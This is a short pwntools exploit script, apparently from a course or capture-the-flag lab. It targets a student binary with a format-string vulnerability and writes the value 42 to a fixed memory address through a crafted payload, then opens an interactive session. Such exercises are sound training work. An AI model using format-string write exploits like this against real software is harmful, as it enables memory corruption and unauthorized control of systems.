#!/usr/bin/env python3
from sys import argv
from pwn import *
import vpn_conf

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 11)
EXE_FILENAME = '../pwn_student_binaries/the_answer_Federico-Conti'

# Set up context for pwntools to know arch/OS
context.binary = e = ELF(EXE_FILENAME, checksec=False)

def start():
    if args.GDB:
        gdbscript = '''
        tbreak *main
        continue
        '''
        return gdb.debug(e.path, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process(e.path)

# --- Step 1: Find the Format String Offset ---
# If you already know the offset is 6 (standard for 64-bit stack buffers), 
# you can skip the loop and set offset_print = 6.
offset_print = 13 

log.info(f"Using Format String Offset: {offset_print}")

target_address = 0x404564

target_value = 0x2a

payload = fmtstr_payload(offset_print, {target_address: target_value})
log.info(f"Constructed Payload: {payload}")

io = start()
io.recvuntil(b"name?")

log.info(f"Sending payload to write {target_value} to {hex(target_address)}...")
io.sendline(payload)
io.interactive()